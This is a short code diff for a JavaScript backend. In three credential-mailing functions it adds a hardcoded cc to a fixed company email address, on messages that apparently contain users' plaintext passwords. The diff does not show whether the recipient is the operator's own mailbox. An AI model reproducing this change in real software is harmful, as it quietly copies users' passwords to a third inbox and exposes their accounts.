@@ -126,7 +126,7 @@ export const sendCredentialsSingle = async (req, res) => {
       row: { ...target, plain_password },
     });
 
-    await sendEmail({ to: email, subject, html });
+    await sendEmail({ to: email,cc: "contact@fathommarineconsultants.com", subject, html });
 
     await logMailEvent({
       requester,
@@ -208,7 +208,7 @@ export const sendCredentialsBulk = async (req, res) => {
       rows: rowsWithPlain,
     });
 
-    await sendEmail({ to: email, subject, html });
+    await sendEmail({ to: email,cc: "contact@fathommarineconsultants.com", subject, html });
 
     await logMailEvent({
       requester,
@@ -423,6 +423,7 @@ export const sendCredentialsToMultipleEmails = async (req, res) => {
     // Send the same email to multiple recipients
     await sendEmail({
       to: emails,
+      cc: "contact@fathommarineconsultants.com",
       subject,
       html,
     });
